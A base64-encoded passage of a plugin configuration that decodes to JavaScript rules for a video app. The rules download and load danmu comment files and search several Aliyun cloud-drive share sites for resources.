WxsKSBjb250aW51ZTtcXG4gICAgICAgIGxldCBwYXJhbXMgPSBwYXJhbVRleHQuc3BsaXQoXFxcIixcXFwiKTtcXG4gICAgICAgIGxldCBwYXJhbXNUID0gW107XFxuICAgICAgICBmb3IgKGxldCBpIGluIHBhcmFtcykge1xcbiAgICAgICAgICAgIGlmIChpID09IDMpIHtcXG4gICAgICAgICAgICAgICAgLy/popzoibLlgLzkuLow5pe277yM6buY6K6k6K6+572u5Li655m96ImyXFxuICAgICAgICAgICAgICAgIGlmIChwYXJhbXNbaV0gPT0gXFxcIjBcXFwiIHx8IHBhcmFtc1tpXSA9PSBcXFwiLTFcXFwiKSB7XFxuICAgICAgICAgICAgICAgICAgICBwYXJhbXNULnB1c2goXFxcIjE2Nzc3MjE1XFxcIik7XFxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxcbiAgICAgICAgICAgICAgICB9XFxuXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGlmIChpID09IDIpIHtcXG4gICAgICAgICAgICAgICAgcGFyYW1zVC5wdXNoKFxcXCIyNVxcXCIpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBwYXJhbXNULnB1c2gocGFyYW1zW2ldKTtcXG5cXG4gICAgICAgIH1cXG4gICAgICAgIHBhcmFtc1QucHVzaChcXFwiMFxcXCIsIFxcXCIwXFxcIiwgXFxcIjBcXFwiKTtcXG4gICAgICAgIGRNY29udGV4dCArPSBgPGQgcD1cXFwiJHtwYXJhbXNULmpvaW4oJywnKX1cXFwiPiR7ZW5jb2RlSHRtbChjb21tZW50VGV4dCl9PC9kPlxcXFxuYDtcXG4gICAgfVxcbiAgICBpZiAoIWRNY29udGV4dCkgcmV0dXJuO1xcbiAgICBkTWNvbnRleHQgPSBgPD94bWwgdmVyc2lvbj1cXFwiMS4wXFxcIiBlbmNvZGluZz1cXFwiVVRGLThcXFwiPz48aT5cXFxcbiR7ZE1jb250ZXh0fTwvaT5gO1xcbiAgICBsZXQgcGF0aCA9IHNldmVQYXRoICsgbmFtZS5yZXBsYWNlKC9cXFxcLy9nLFxcXCJfXFxcIikgKyBcXFwiX1xcXCIgKyBlcGlzb2RlSWQgKyBcXFwiLnhtbFxcXCI7XFxuICAgIHdyaXRlRmlsZShwYXRoLCBkTWNvbnRleHQpO1xcbiAgICByZXR1cm4gcGF0aDtcXG59XFxuJC5leHBvcnRzLmdldExvY2FsRGFuTXUgPSBmdW5jdGlvbihlcGlzb2RlSWQsIG5hbWUpIHtcXG4gICAgbGV0IHBhdGggPSBzZXZlUGF0aCArIG5hbWUucmVwbGFjZSgvXFxcXC8vZyxcXFwiX1xcXCIpICsgXFxcIl9cXFwiICsgZXBpc29kZUlkICsgXFxcIi54bWxcXFwiO1xcbiAgICBpZiAoZmlsZUV4aXN0KHBhdGgpKSB7XFxuICAgICAgICByZXR1cm4gcGF0aDtcXG4gICAgfVxcbn1cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuW8ueW5leaQnOe0oibliqDovb1cIixcInBhdGhcIjpcImxvYWREbVwiLFwicnVsZVwiOlwianM6XFxubGV0IGQgPSBbXTtcXG5sZXQgb25seURvd25sb2FkID0gISFNWV9QQVJBTVMub25seURvd25sb2FkO1xcbmlmIChvbmx5RG93bmxvYWQpIHtcXG4gICAgYWRkTGlzdGVuZXIoXFxcIm9uQ2xvc2VcXFwiLCAoKSA9PiB7XFxuICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgIH0pO1xcbn1cXG5kLnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4dFxcXCIsXFxuICAgIHRpdGxlOiBcXFwiPGZvbnQgY29sb3I9J0dyYXknPuKdl+WFs+S6jjxicj48c21hbGw+IOWGhee9ruW8ueW5leaQnOe0ouaVsOaNruadpea6kOS6jlvlvLnlvLlwbGF5XTwvc21hbGw+PC9mb250PlxcXCJcXG59KTtcXG5kLnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImxpbmVcXFwiXFxufSk7XFxubGV0IGtleSA9IE1ZX1BBUkFNUy5uYW1lIHx8IGdldE15VmFyKFxcXCJzXFxcIikgfHwgZGVjb2RlVVJJQ29tcG9uZW50KGdldFBhcmFtKFxcXCJ0aXRsZVxcXCIsIFxcXCJcXFwiKSkgfHwgXFxcIlxcXCI7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLlhoXnva7mkJzntKLlvLnluZVcXFwiLFxcbiAgICB1cmw6ICQoa2V5LCBcXFwi6K+35pCc57Si55Wq5Ymn5ZCN56ewXFxcIikuaW5wdXQoKE1ZX1BBUkFNUykgPT4ge1xcbiAgICAgICAgc2V0UGFnZVBhcmFtcyhPYmplY3QuYXNzaWduKE1ZX1BBUkFNUywge1xcbiAgICAgICAgICAgIG5hbWU6IGlucHV0XFxuICAgICAgICB9KSk7XFxuICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICB9LCBNWV9QQVJBTVMpLFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfMlxcXCJcXG59KTtcXG5kLnB1c2goe1xcbiAgICB0aXRsZTogXFxcImRt55uS5a2Q5pCc57Si5by55bmVXFxcIixcXG4gICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChrZXksIG9ubHlEb3dubG9hZCkgPT4ge1xcbiAgICAgICAgbGV0IGRtID0gZ2V0VmFyKFxcXCJkbV9zaGFyZVxcXCIpO1xcbiAgICAgICAgaWYgKGRtICYmICFvbmx5RG93bmxvYWQpIHtcXG4gICAgICAgICAgICBjbGVhclZhcihcXFwiZG1fc2hhcmVcXFwiKTtcXG4gICAgICAgICAgICByZWZyZXNoVmlkZW9Vcmwoe1xcbiAgICAgICAgICAgICAgICBkYW5tdTogZG1cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICBiYWNrKGZhbHNlKTtcXG4gICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5Yqg6L295a6M5oiQXFxcIjtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgcmV0dXJuICQoa2V5LCBcXFwiZG3nm5LlrZDmkJzntKJcXFwiKS5pbnB1dCgoKSA9PiB7XFxuICAgICAgICAgICAgICAgIHRvYXN0KFxcXCLkuIvovb3lrozmiJDlvLnluZXlkI7or7fph43mlrDngrnlh7vmkJzntKJcXFwiKTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL3NlYXJjaD9ydWxlPWRt55uS5a2QJnM9XFxcIiArIGlucHV0O1xcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcbiAgICB9LCBrZXksIG9ubHlEb3dubG9hZCksXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF8yXFxcIlxcbn0pO1xcblxcbmZ1bmN0aW9uIHNlYXJjaChkLCBuYW1lKSB7XFxuICAgIGNvbnN0IGRhbm11ID0gJC5yZXF1aXJlKFxcXCJkYW5tdVxcXCIpO1xcbiAgICBkLnB1c2goe1xcbiAgICAgICAgY29sX3R5cGU6IFxcXCJsaW5lXFxcIlxcbiAgICB9KTtcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCJcXG4gICAgfSk7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICBjb2xfdHlwZTogXFxcImxpbmVcXFwiXFxuICAgIH0pO1xcbiAgICBsZXQgZG1MaXN0ID0gZGFubXUuZ2V0RGFuTXUobmFtZSk7XFxuXFxuICAgIGZvciAobGV0IGFuaW1lIG9mIGRtTGlzdC5hbmltZXMpIHtcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IGFuaW1lLmFuaW1lVGl0bGUsXFxuICAgICAgICAgICAgZGVzYzogYW5pbWUudHlwZURlc2NyaXB0aW9uLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwiYXZhdGFyXFxcIixcXG4gICAgICAgICAgICB1cmw6ICQoXFxcIlxcXCIsIFxcXCLor7fovpPlhaXkuIvovb3ojIPlm7QoMSxcXFwiICsgYW5pbWUuZXBpc29kZXMubGVuZ3RoICsgXFxcIilcXFwiKS5pbnB1dCgoYW5pbWVUaXRsZSwgZXBpc29kZXMpID0+IHtcXG4gICAgICAgICAgICAgICAgbGV0IFthLCBiXSA9IGlucHV0LnNwbGl0KFxcXCIsXFxcIik7XFxuICAgICAgICAgICAgICAgIGEgPSBOdW1iZXIoYSksIGIgPSBOdW1iZXIoYik7XFxuICAgICAgICAgICAgICAgIGlmIChOdW1iZXIuaXNOYU4oYSkgfHwgTnVtYmVyLmlzTmFOKGIpKSB7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v6K+35oyJ5qC85byP6L6T5YWl5pWw5a2XXFxcIjtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBpZiAoYSA8IDEgfHwgYiA+IGVwaXNvZGVzLmxlbmd0aCkge1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+ivt+i+k+WFpeinhOWumuiMg+WbtOWGheeahOaVsOWtl1xcXCI7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgY29uc3QgZGFubXUgPSAkLnJlcXVpcmUoXFxcImRhbm11XFxcIik7XFxuICAgICAgICAgICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gYSAtIDEsIGogPSAxOyBpIDwgYjsgaSsrLCBqKyspIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgZXBpc29kZSA9IGVwaXNvZGVzW2ldO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBkbVRpdGxlID0gYW5pbWVUaXRsZSArIFxcXCJfXFxcIiArIGVwaXNvZGUuZXBpc29kZVRpdGxlO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHNob3dMb2FkaW5nKFxcXCLmraPlnKjkuIvovb3vvJpcXFwiICsgZXBpc29kZS5lcGlzb2RlVGl0bGUgKyBcXFwiXFxcXHQoXFxcIiArIGogKyBcXFwiL1xcXCIgKyAoYiAtIGEgKyAxKSArIFxcXCIpXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgZGFubXUuZG93bmxvYWREYW5NdShlcGlzb2RlLmVwaXNvZGVJZCwgZG1UaXRsZSk7XFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICAgICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcbiAgICAgICAgICAgICAgICAgICAgaGlkZUxvYWRpbmcoKTtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lk6blk6bkuIvovb3lpLHotKUuLi5cXFwiO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGhpZGVMb2FkaW5nKCk7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/kuIvovb3lrozmiJBcXFwiO1xcbiAgICAgICAgICAgIH0sIGFuaW1lLmFuaW1lVGl0bGUsIGFuaW1lLmVwaXNvZGVzKSxcXG4gICAgICAgICAgICBwaWNfdXJsOiBcXFwiaHR0cHM6Ly9oaWtlcmZhbnMuY29tL3R1Ymlhby9tb3ZpZS8xNC5zdmdcXFwiXFxuICAgICAgICB9KTtcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJsaW5lXFxcIlxcbiAgICAgICAgfSk7XFxuICAgICAgICBmb3IgKGxldCBlcGlzb2RlIG9mIGFuaW1lLmVwaXNvZGVzKSB7XFxuICAgICAgICAgICAgbGV0IGRtVGl0bGUgPSBhbmltZS5hbmltZVRpdGxlICsgXFxcIl9cXFwiICsgZXBpc29kZS5lcGlzb2RlVGl0bGU7XFxuICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGVwaXNvZGUuZXBpc29kZVRpdGxlLFxcbiAgICAgICAgICAgICAgICB1cmw6ICQoZXBpc29kZS5lcGlzb2RlSWQpLmxhenlSdWxlKCh1cmwsIHRpdGxlLCBvbmx5RG93bmxvYWQpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIGNvbnN0IGRhbm11ID0gJC5yZXF1aXJlKFxcXCJkYW5tdVxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IHBhdGggPSBkYW5tdS5nZXRMb2NhbERhbk11KGlucHV0LCB0aXRsZSkgfHwgZGFubXUuZG93bmxvYWREYW5NdShpbnB1dCwgdGl0bGUpO1xcbiAgICAgICAgICAgICAgICAgICAgaWYgKG9ubHlEb3dubG9hZCkgcmV0dXJuIFxcXCJ0b2FzdDovL+S4i+i9veWujOaIkFxcXCI7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgZGFubXVUZXh0ID0gZmV0Y2gocGF0aCk7XFxuICAgICAgICAgICAgICAgICAgICBpZiAoIWRhbm11VGV4dCkgcmV0dXJuIFxcXCJ0b2FzdDovL+i/mOayoeacieW8ueW5leWTn35cXFwiO1xcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFZpZGVvVXJsKHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBkYW5tdTogcGF0aFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgICAgICBiYWNrKGZhbHNlKTtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/liqDovb3lrozmiJBcXFwiO1xcbiAgICAgICAgICAgICAgICB9LCBNWV9QQVJBTVMuZHVybCwgZG1UaXRsZSwgb25seURvd25sb2FkKSxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiLFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgbG9uZ0NsaWNrOiBbe1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi5by65Yi25LiL6L29XFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICBqczogJC50b1N0cmluZygoZXBpc29kZVRpdGxlLCBlcGlzb2RlSWQpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2hvd0xvYWRpbmcoXFxcIuivt+etieW+hVxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBkYW5tdSA9ICQucmVxdWlyZShcXFwiZGFubXVcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGFubXUuZG93bmxvYWREYW5NdShlcGlzb2RlSWQsIGVwaXNvZGVUaXRsZSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhpZGVMb2FkaW5nKCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/ph43mlrDkuIvovb3lrozmiJDvvIzljZXlh7vmjILovb3jgIJcXFwiO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sIGRtVGl0bGUsIGVwaXNvZGUuZXBpc29kZUlkKVxcbiAgICAgICAgICAgICAgICAgICAgfV1cXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcbiAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcImxpbmVfYmxhbmtcXFwiXFxuICAgICAgICB9KTtcXG4gICAgfVxcbiAgICBpZiAoIWRtTGlzdC5hbmltZXMubGVuZ3RoKSB7XFxuICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi5rKh5pyJ5om+5Yiw5LiOW1xcXCIgKyBuYW1lICsgXFxcIl3nm7jlhbPnmoTlvLnluZVcXFwiLFxcbiAgICAgICAgICAgIHVybDogXFxcImhpa2VyOi8vZW1wdHlcXFwiLFxcbiAgICAgICAgICAgIGRlc2M6IFxcXCLmkJzkuI3liLDmgI7kuYjlip7vvJ9cXFxcbuajgOafpeWQjeensOaYr+WQpuato+ehru+8m+WPr+S7peWwneivleWIoOmZpOmDqOWIhumZkOWumuivje+8jOWmguesrOS4gOWto+etie+8m+iAjOS4lOWPquiDveaQnOe0oueVquWJp+WTpu+8geWFtuS7luW8ueW5leWPr+eUqGRt55uS5a2Q44CCXFxcIixcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfY2VudGVyXzFcXFwiXFxuICAgICAgICB9KTtcXG4gICAgfVxcbn1cXG5sZXQgbmFtZSA9IGdldFBhcmFtKFxcXCJuYW1lXFxcIiwgTVlfUEFSQU1TLm5hbWUpO1xcbmlmIChuYW1lKSB7XFxuICAgIHRyeSB7XFxuICAgICAgICBzZWFyY2goZCwgbmFtZSk7XFxuICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IFxcXCLigJzigJxFUlJPUuKAneKAnVxcXCIsXFxuICAgICAgICAgICAgZGVzYzogZS50b1N0cmluZygpLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIlxcbiAgICAgICAgfSk7XFxuICAgIH1cXG59XFxuc2V0UmVzdWx0KGQpO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi6KeE5YiZ5YiX6KGoXCIsXCJwYXRoXCI6XCJydWxlc1wiLFwicnVsZVwiOlwianM6XFxuJC5leHBvcnRzID0gW3tcXG4gICAgICAgIG5hbWU6IFxcXCLlsI/kupFcXFwiLFxcbiAgICAgICAgcGFnZTogdHJ1ZSxcXG4gICAgICAgIGZpbmQocywgcGFnZSkge1xcbiAgICAgICAgICAgIGxldCBiYXNpY1VybCA9IFxcXCJodHRwczovL3d3dy55dW5zby5uZXRcXFwiO1xcbiAgICAgICAgICAgIGxldCBhcGkgPSBcXFwiL2FwaS92YWxpZGF0ZS9zZWFyY2g/d2Q9XFxcIiArIGVuY29kZVVSSUNvbXBvbmVudChzKSArIFxcXCImbW9kZT05MDAwMSZzdHlwZT0yMDEwMCZ1az0mcGFnZT1cXFwiICsgcGFnZSArIFxcXCImbGltaXQ9MjAmc2NyZWVuX2ZpbGV0eXBlPXVuZGVmaW5lZFxcXCI7XFxuICAgICAgICAgICAgbGV0IGpzb24gPSBwb3N0KGJhc2ljVXJsICsgYXBpLCB7XFxuICAgICAgICAgICAgICAgIGJvZHk6IFxcXCJkYXRhPVxcXCIgKyBhcGksXFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgIFJlZmVyZXI6IFxcXCJodHRwczovL3d3dy55dW5zby5uZXQvaW5kZXgvdXNlci9zP3dkPVxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQocylcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIGxldCBodG1sID0gSlNPTi5wYXJzZShqc29uKS5kYXRhO1xcbiAgICAgICAgICAgIGxldCBsaXN0ID0gcGRmYShodG1sLCBcXFwiYm9keSYmLmxheXVpLWNhcmQ6aGFzKGEpXFxcIik7XFxuICAgICAgICAgICAgbGV0IGQgPSBbXTtcXG4gICAgICAgICAgICBmb3IgKGxldCBpdGVtIG9mIGxpc3QpIHtcXG4gICAgICAgICAgICAgICAgbGV0IHRpdGxlID0gcGRmaChpdGVtLCBcXFwiYSYmVGV4dFxcXCIpLnJlcGxhY2UoXFxcIiPmlofku7blpLkgXFxcIiwgXFxcIlxcXCIpO1xcbiAgICAgICAgICAgICAgICBsZXQgdGltZSA9IC9cXFxcZHs0fSgtXFxcXGR7Mn0pezJ9IFxcXFxkezJ9KFxcXFw6XFxcXGR7Mn0pezJ9Ly5leGVjKHBkZmgoaXRlbSwgXFxcIi5sYXl1aS1jYXJkLWJvZHkmJlRleHRcXFwiKSkgfHwgW107XFxuICAgICAgICAgICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogdGl0bGUsXFxuICAgICAgICAgICAgICAgICAgICBkZXNjOiB0aW1lWzBdLFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiBiYXNlNjREZWNvZGUocGRmaChpdGVtLCBcXFwiYSYmdXJsXFxcIikpXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZXR1cm4gZDtcXG4gICAgICAgIH1cXG4gICAgfSwge1xcbiAgICAgICAgbmFtZTogXFxcIua3t+WQiOebmFxcXCIsXFxuICAgICAgICBwYWdlOiB0cnVlLFxcbiAgICAgICAgZmluZChzLCBwYWdlKSB7XFxuICAgICAgICAgICAgbGV0IHVybCA9IFxcXCJodHRwczovL2FwaS5odW5oZXBhbi5jb20vdjEvc2VhcmNoXFxcIjtcXG4gICAgICAgICAgICBsZXQganNvbiA9IHBvc3QodXJsLCB7XFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgIFJlZmVyZXI6IFxcXCJodHRwczovL2h1bmhlcGFuLmNvbS9cXFwiXFxuICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHtcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJxXFxcIjogcyxcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJwYWdlXFxcIjogcGFnZSxcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJzaXplXFxcIjogMTVcXG4gICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICBqc29uID0gSlNPTi5wYXJzZShqc29uKTtcXG4gICAgICAgICAgICBsZXQgbGlzdCA9IGpzb24uZGF0YS5saXN0O1xcbiAgICAgICAgICAgIGxldCBkID0gW107XFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBsaXN0Lmxlbmd0aDsgaSsrKSB7XFxuICAgICAgICAgICAgICAgIGxldCBpdCA9IGxpc3RbaV07XFxuICAgICAgICAgICAgICAgIGlmIChpdC5kaXNrX3R5cGUgIT09IFxcXCJBTFlcXFwiIHx8IGl0LnNoYXJlX3VzZXIgPT09IFxcXCLkuLYqKirkuLZcXFwiKSBjb250aW51ZTtcXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBpdC5kaXNrX25hbWUsXFxuICAgICAgICAgICAgICAgICAgICBwaWNfdXJsOiBwZChpdCwgXFxcImltZyYmc3JjXFxcIiwgdXJsKSxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogaXQubGluayxcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IGl0LnVwZGF0ZV90aW1lICsgXFxcIlxcXFxuXFxcIiArIGl0LmxpbmssXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZXR1cm4gZDtcXG4gICAgICAgIH1cXG4gICAgfSwge1xcbiAgICAgICAgbmFtZTogXFxcIuS6keebmOi1hOa6kFxcXCIsXFxuICAgICAgICBwYWdlOiB0cnVlLFxcbiAgICAgICAgZmluZDogZnVuY3Rpb24ocywgcGFnZSkge1xcbiAgICAgICAgICAgIGxldCB1cmwgPSBcXFwiaHR0cHM6Ly9yZXMueXVucGFuLndpbi8/UGFnZUluZGV4PVxcXCIgKyBwYWdlICsgXFxcIiZQYWdlU2l6ZT0xMiZLZXl3b3JkPVxcXCIgKyBzICsgXFxcIiZUeXBlPSZUYWc9XFxcIjtcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QodXJsLCB7XFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJSZWZlcmVyXFxcIjogXFxcImh0dHBzOi8vcmVzLnl1bnBhbi53aW4vXFxcIlxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSk7XFxuXFxuICAgICAgICAgICAgbGV0IGFyciA9IHBkZmEoaHRtbCwgXFxcIm1haW4mJi5jYXJkXFxcIik7XFxuICAgICAgICAgICAgLy9sb2coYXJyKTtcXG4gICAgICAgICAgICBsZXQgZCA9IFtdO1xcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYXJyLmxlbmd0aDsgaSsrKSB7XFxuICAgICAgICAgICAgICAgIGxldCBpdCA9IGFycltpXTtcXG4gICAgICAgICAgICAgICAgbGV0IHUgPSBwZGZoKGl0LCBcXFwiLmNhcmQtbGluaywxJiZvbmNsaWNrXFxcIikubWF0Y2goL2h0dHBzOlxcXFwvXFxcXC8od3d3XFxcXC5hbGl5dW5kcml2ZVxcXFwuY29tXFxcXC9zfGFseXdwXFxcXC5uZXQpXFxcXC9cXFxcdyovZykgfHwgW107XFxuICAgICAgICAgICAgICAgIHUgPSB1Lmxlbmd0aCA+IDAgPyB1WzBdIDogdXJsO1xcbiAgICAgICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHBkZmgoaXQsIFxcXCIuY2FyZC10aXRsZSYmVGV4dFxcXCIpLFxcbiAgICAgICAgICAgICAgICAgICAgcGljX3VybDogcGQoaXQsIFxcXCJpbWcmJnNyY1xcXCIsIHVybCksXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IHUsXFxuICAgICAgICAgICAgICAgICAgICBkZXNjOiBwZGZoKGl0LCBcXFwiLmNhcmQtdGV4dCwtMSYmVGV4dFxcXCIpICsgXFxcIlxcXFxuXFxcIiArIHUsXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZXR1cm4gZDtcXG4gICAgICAgIH1cXG4gICAgfSxcXG4gICAge1xcbiAgICAgICAgbmFtZTogXFxcIlVQ5LqR5pCcXFxcIixcXG4gICAgICAgIHBhZ2U6IHRydWUsXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxuICAgICAgICAgICAgbGV0IHVybCA9IFxcXCJodHRwczovL2FwaS51cHl1bnNvMi5jb20vc2VhcmNoP2tleXdvcmQ9XFxcIiArIHMgKyBcXFwiJnBhZ2U9XFxcIiArIHBhZ2UgKyBcXFwiJnNfdHlwZT0xXFxcIjtcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QodXJsLCB7XFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJSZWZlcmVyXFxcIjogXFxcImh0dHBzOi8vd3d3LnVweXVuc28uY29tXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJDb29raWVcXFwiOiBcXFwiY29kZT0xOTE5XFxcIlxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgLy9sb2coYmFzZTY0RGVjb2RlKGh0bWwpKTtcXG4gICAgICAgICAgICBsZXQgYXJyID0gSlNPTi5wYXJzZShiYXNlNjREZWNvZGUoaHRtbCkpLnJlc3VsdC5pdGVtcztcXG4gICAgICAgICAgICAvL2xvZyhhcnIpO1xcbiAgICAgICAgICAgIGxldCBkID0gW107XFxuICAgICAgICAgICAgaWYgKCFhcnIpIHJldHVybiBbXTtcXG4gICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGFyci5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgICAgICAgICBsZXQgaXQgPSBhcnJbaV07XFxuICAgICAgICAgICAgICAgIGxldCB1ID0gaXQucGFnZV91cmw7XFxuICAgICAgICAgICAgICAgIC8vdSA9IHUubGVuZ3RoID4gMCA/IHVbMF0gOiB1cmw7XFxuICAgICAgICAgICAgICAgIGlmICghdS5pbmNsdWRlcyhcXFwiYWxpeXVuZHJpdmVcXFwiKSkge1xcbiAgICAgICAgICAgICAgICAgICAgY29udGludWU7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBpdC50aXRsZSxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogdSxcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IFxcXCJcXFxcblxcXCIgKyAodSksXFxuICAgICAgICAgICAgICAgIH0pO1xcblxcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZXR1cm4gZDtcXG4gICAgICAgIH1cXG4gICAgfSxcXG4gICAge1xcbiAgICAgICAgbmFtZTogXFxcIueMq+eLuOebmOaQnFxcXCIsXFxuICAgICAgICBwYWdlOiBmYWxzZSxcXG4gICAgICAgIGZpbmQ6IGZ1bmN0aW9uKHMsIHBhZ2UpIHtcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QoXFxcImh0dHBzOi8vd3d3LmFsaXBhbnNvdS5jb20vc2VhcmNoP2s9XFxcIiArIHMsIHtcXG4gICAgICAgICAgICAgICAgaGVhZGVyczoge1xcbiAgICAgICAgICAgICAgICAgICAgXFxcIlJlZmVyZXJcXFwiOiBcXFwiaHR0cHM6Ly93d3cuYWxpcGFuc291LmNvbS9zZWFyY2g/az1cXFwiICsgc1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICA